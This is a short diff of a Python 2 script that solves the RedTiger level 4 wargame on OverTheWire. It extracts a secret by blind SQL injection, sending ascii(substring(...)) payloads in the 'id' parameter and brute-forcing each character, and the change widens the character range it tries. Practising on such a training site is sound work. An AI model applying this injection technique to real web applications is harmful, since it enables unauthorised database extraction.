@@ -8,7 +8,7 @@ headers1 = {'Cookie': 'level4login=there_is_no_bug'}
 url1="http://redtiger.labs.overthewire.org/level4.php?id=1%20and%20ascii(substring((SELECT%20keyword%20FROM%20level4_secret)"
 ketqua=''
 for i in range(1,27):
-	for j in range(48,122):		
+	for j in range(1,127):		
 		url=url1+',%d,1))=%d'%(i,j)
 		line=urllib2.Request(url=url,headers=headers1)
 		line2=urllib2.urlopen(line).read()
